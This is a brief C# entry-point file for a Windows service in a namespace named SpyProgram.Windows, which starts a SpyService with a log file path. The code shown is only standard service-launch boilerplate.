using System;
using System.Collections.Generic;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace SpyProgram.Windows
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static void Main(string[] args)
        {
            var logfilePath = args.Count() > 0? args[0] : "logfile.txt";
            
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new SpyService(logfilePath)
            };
            ServiceBase.Run(ServicesToRun);
        }
    }
}
